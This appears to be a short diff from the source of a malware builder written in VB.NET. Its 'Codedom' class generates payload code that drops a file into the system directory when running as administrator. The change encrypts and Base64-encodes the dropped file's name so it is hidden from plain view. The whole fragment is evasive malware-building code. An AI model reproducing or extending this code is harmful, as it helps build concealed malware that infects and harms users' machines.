@@ -265,7 +265,7 @@ Public Class Codedom
                 stringb.Replace("DefSystem32", "true")
                 stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & "), Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
             Else
-                stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & "," & Chr(34) & F.txtInstallFileName.Text & Chr(34) & ")")
+                stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & ", Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))))")
             End If
 
 
